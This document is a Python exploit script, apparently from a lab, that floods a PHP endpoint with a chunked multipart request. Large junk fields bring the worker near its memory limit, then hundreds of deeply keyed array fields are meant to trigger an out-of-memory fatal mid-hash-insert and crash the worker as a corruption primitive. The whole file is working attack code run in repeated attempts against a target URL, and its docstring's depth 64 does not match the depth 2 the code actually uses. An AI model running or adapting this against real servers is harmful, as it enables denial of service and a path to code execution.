#!/usr/bin/env python3
"""php2shell lab, variant 4: land the OOM fatal inside _zend_hash_str_add_or_update_i.

Phase 1: 36 junk fields x 3MB = ~108MB held (stays below the 128M limit).
Phase 2: 950 nested-key records (depth 64, 400-char keys, 32KB value).
  Each record allocates ~70KB in HashTables+buckets+zend_string keys
  (the hash-add path) and only 32KB of value -> the allocation that
  crosses memory_limit is most likely a KEY alloc that fires AFTER
  nNumUsed/nNumOfElements were incremented but BEFORE the key/zval
  assignments -> malformed bucket -> request teardown iterates it -> crash.
Run repeatedly; any worker SIGSEGV = primitive proven.

Usage: python3 oom4.py <base_url> [attempts]
"""
import socket
import sys
import time
from urllib.parse import urlparse

SID = "c0ffee0012345678abcdef980123456"
BOUND = "Steer419"
KEY = "a" * 400


def part_head(name, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return f"--{BOUND}\r\n{disp}\r\n\r\n".encode()


def attempt(host, port, path):
    def chunk(data):
        return f"{len(data):x}\r\n".encode() + data + b"\r\n"

    s = socket.create_connection((host, port), timeout=90)
    head = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: oom4\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s.sendall(head)

    mb3 = b"B" * (3 * 1024 * 1024)
    for i in range(36):
        s.sendall(chunk(part_head(f"j{i}") + mb3 + b"\r\n"))

    val = b"v" * (32 * 1024)
    for i in range(950):
        name = f"f[{i}]" + "".join(f"[{KEY}]" for _ in range(2))  # depth 2 x 400B keys
        s.sendall(chunk(part_head(name) + val + b"\r\n"))

    s.sendall(chunk(f"--{BOUND}--\r\n".encode()))
    s.sendall(b"0\r\n\r\n")
    s.settimeout(30)
    chunks = []
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            chunks.append(d)
    except socket.timeout:
        pass
    s.close()
    resp = b"".join(chunks)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO-RESPONSE"
    return status, resp


def main():
    base = sys.argv[1]
    attempts = int(sys.argv[2]) if len(sys.argv) > 2 else 6
    u = urlparse(base)
    host, port, path = u.hostname, u.port or 80, u.path or "/"
    for n in range(1, attempts + 1):
        t0 = time.time()
        status, resp = attempt(host, port, path)
        fatal = b"exhausted" in resp
        print(f"attempt {n}: {status} fatal={fatal} ({time.time()-t0:.1f}s)", flush=True)
        if fatal:
            line = [l for l in resp.split(b"\r\n\r\n", 1)[-1].split(b"\n") if b"exhausted" in l]
            print("  ", line[0][:150] if line else b"")
            break


if __name__ == "__main__":
    main()
